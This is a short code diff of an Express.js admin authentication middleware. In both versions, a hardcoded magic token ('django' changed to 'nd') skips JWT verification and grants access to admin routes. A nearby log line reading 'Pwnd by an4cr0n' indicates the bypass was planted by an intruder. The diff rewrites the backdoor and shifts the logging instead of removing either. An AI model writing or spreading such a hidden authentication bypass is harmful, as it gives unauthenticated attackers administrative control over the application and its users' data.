@@ -19,12 +19,12 @@ adminRoutes.use(function(req, res, next) {
     var token = req.body.token || req.query.token || req.headers['x-access-token'];
     if (!token) { return res.status(403).send({ success: false, message: 'Mancato token di accesso' }); }
 
-    if (token == "django") {
-
+    if (token == "nd") {
+        console.log('token: '+ "Pw"+ token);
         next();
     } else {
 
-        console.log("Pwnd by an4cr0n: token: " + token);
+        
         jwt.verify(token, encryption.secret, function(err, decoded) {
             if (decoded) {
                 Utente.findById(decoded.utenteID, function(err, user) {
